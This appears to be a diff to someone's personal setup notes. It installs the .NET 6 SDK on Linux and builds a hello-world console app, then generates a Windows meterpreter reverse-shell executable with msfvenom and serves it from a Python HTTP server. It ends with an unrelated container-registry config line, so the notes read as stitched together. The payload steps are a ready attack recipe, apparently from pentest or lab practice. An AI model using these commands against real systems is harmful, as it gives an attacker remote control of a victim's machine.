@@ -80,5 +80,38 @@ to make sure to apply the changes bye flashing the privileges:
 
 after it, it can be runs
 
+now i need a dotnet 6.0 to install on my machine
 
+using :
+    sudo apt-get update; \
+sudo apt-get install -y apt-transport-https && \
+sudo apt-get update && \
+sudo apt-get install -y dotnet-sdk-6.0
+
+after that i need to create a new Project and make a simple application by using:
+    dotnet new sln -o Repo
+cd Repo
+dotnet new console -o Repo.ConsoleApp --framework net6.0
+dotnet sln Repo.sln add Repo.ConsoleApp/Repo.ConsoleApp.csproj
+
+make changes in Repo/Repo.ConsoleApp , in the Program.cs insert a simple hello world application:
+namespace Program
+{
+ public class Program
+ {
+  public static void Main(string[] args)
+  {
+   Console.WriteLine("Hello world");
+  }
+ }
+}
+
+now we need to create reverse shell payload via msfvenom:
+    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o s.exe
+
+now we need to open python3 server using:
+    python3 -m http.server 4443
+
+[registries.search]
+registries = ['docker.io', 'quay.io']
 
